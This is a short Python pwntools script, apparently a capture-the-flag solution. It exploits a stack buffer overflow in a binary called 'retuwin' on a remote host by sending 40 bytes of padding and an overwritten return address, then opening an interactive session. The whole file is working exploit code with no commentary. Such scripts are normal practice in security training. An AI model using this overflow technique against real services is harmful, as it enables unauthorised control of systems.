from pwn import *

# conn = process('./retuwin')
conn = remote('130.192.5.212', 1951)
conn.recvuntil(b'input:', drop=True)

line = b'A'*40
line += p64(0x00400687)
conn.sendline(line)


conn.interactive()

